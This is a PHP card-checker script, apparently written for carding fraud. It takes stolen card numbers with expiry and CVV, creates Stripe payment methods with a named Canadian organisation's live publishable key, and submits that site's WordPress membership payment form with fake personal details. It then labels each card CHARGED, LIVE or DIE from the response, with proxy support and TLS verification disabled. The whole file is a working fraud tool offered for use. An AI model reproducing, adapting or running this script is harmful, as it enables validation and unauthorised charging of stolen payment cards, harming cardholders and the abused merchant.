<?php 


///--------------------BADBOY-----------------///


//error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
require('CurlX.php');
//================ [ FUNCTIONS & LISTA ] ===============//




function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };  
    
function getStr($str, $startDelimiter, $endDelimiter) {
    $startDelimiterLength = strlen($startDelimiter);
    $startPos = strpos($str, $startDelimiter);
    if ($startPos === false) {
        return '';
    }
    $startPos += $startDelimiterLength;
    $endPos = strpos($str, $endDelimiter, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($str, $startPos, $endPos - $startPos);
}




//$lista='5524903605406827|08|2028|715';
$idd = $_GET['idd'];
$stgid = $_GET['stgid'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

////////////////////////////===[1 Req]

sleep(5);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=68e133db-c304-4338-886a-a3bc24dfea0a88e0e0&sid=4cc450e8-5dad-4d2e-9132-771a960101322d63d7&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+card-element&referrer=https%3A%2F%2Fwww.kaientrails.ca&time_on_page=71360&key=pk_live_51MjvmRFL2ntPTriuAuQAvLdiCqjTQTWCKW1etoFlCsGlQK5DISEi5JWL2xNFCidaMUqhe7oiSQi0rPgjyB8zen1S008nsNqeLa');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$country1 = trim(strip_tags(getStr($result1,'"country": "','"')));
$funding1 = trim(strip_tags(getStr($result1,'"funding": "','"')));

////////////////////////////===[2 Req]

sleep(5);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://www.kaientrails.ca/wp-admin/admin-ajax.php?t=1733130241677');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1733130241677 HTTP/2',
'Host: www.kaientrails.ca',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'x-requested-with: XMLHttpRequest
sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://www.kaientrails.ca',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.kaientrails.ca/membership-information/',
'accept-language: en-US,en;q=0.9',
'cookie: _ga: GA1.1.1040086819.1733130125
__stripe_mid: 68e133db-c304-4338-886a-a3bc24dfea0a88e0e0
__stripe_sid: 4cc450e8-5dad-4d2e-9132-771a960101322d63d7
_ga_HZ8Q941G2Z: GS1.1.1733130125.1.1.1733130172.0.0.0',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D128%26_fluentform_3_fluentformnonce%3D42c2c43e53%26_wp_http_referer%3D%252Fmembership-information%252F%26names%255Bfirst_name%255D%3DKhant%2520Ti%26names%255Blast_name%255D%3DThua%26address_1%255Baddress_line_1%255D%3DHddhxh%26address_1%255Baddress_line_2%255D%3DHhxhh%26address_1%255Bcity%255D%3DHhhh%26address_1%255Bstate%255D%3DDistrict%2520of%2520Columbia%26address_1%255Bzip%255D%3DZhzhx%26address_1%255Bcountry%255D%3DGB%26phone%3D%252B601163676400%26email%3Dthur07656%2540gmail.com%26payment_input%3D2025%2520Youth%2520Membership%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');

$result2 = curl_exec($ch);

////////////////////////////===[Responses CVV]===////////////////////////////

sleep(5);
if
(strpos($result2,  'success')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#CHARGED CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: Payment Done 4$ ✅</i></font><br> <font class='badge badge-dark'> $bank $country chk1212 </i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country chk1212 </i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country chk1212 </i></font><br>";
}

elseif
(strpos($result2,  'insufficient funds')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: INSUFFICENT FUNDS ✅ </i></font><br> <font class='badge badge-dark'> $bank $country chk1212 </i></font><br>";
}

elseif
(strpos($result2,  'next_action')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: 3D CARD ✅ </i></font><br> <font class='badge badge-dark'> $bank $country chk1212 </i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV LIVE ✅ </i></font><br> <font class='badge badge-dark'> $bank $country chk1212 </i></font><br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: Your card was declined ❌ </i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
echo $result2;
////////////////////////////===RAW BY HARIS===////////////////////////////
?>
